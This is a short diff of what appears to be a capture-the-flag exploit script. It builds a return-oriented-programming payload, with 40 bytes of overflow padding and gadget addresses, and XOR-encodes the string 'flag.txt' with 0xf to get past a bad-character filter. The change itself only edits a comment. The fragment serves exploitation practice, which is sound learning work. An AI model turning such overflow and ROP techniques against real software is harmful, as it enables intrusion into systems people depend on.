@@ -11,7 +11,7 @@ gad5 = 0x000000000040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 PRINT = 0x400510
 data = 0x601038
 xor_byte = 0xf
-flag = 0x7b777b21686e6369 #flag.txt
+flag = 0x7b777b21686e6369 #flag.txt ^ 0xf
 
 payload =b'A'*40
 payload += p64(gad5)
